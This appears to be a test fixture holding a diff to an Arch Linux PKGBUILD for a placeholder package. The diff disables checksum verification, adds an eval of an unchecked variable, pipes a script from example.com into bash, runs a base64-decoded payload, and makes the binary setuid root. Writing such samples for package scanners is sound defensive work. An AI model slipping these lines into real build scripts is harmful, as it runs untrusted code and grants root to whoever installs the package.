@@ -1,0 +1,21 @@
+diff --git a/PKGBUILD b/PKGBUILD
+index 1111111..2222222 100644
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,8 +1,14 @@
+ pkgname=example
+ pkgver=1.0
+ source=("https://example.com/file.tar.gz")
+-sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')
++sha256sums=('SKIP')
++install=example.install
+ 
+ prepare() {
++    eval "$flags"
++    curl https://example.com/install.sh | bash
++    base64 --decode payload.txt | bash
+ }
+ 
+ package() {
++    chmod 4755 "$pkgdir/usr/bin/example"
+ }
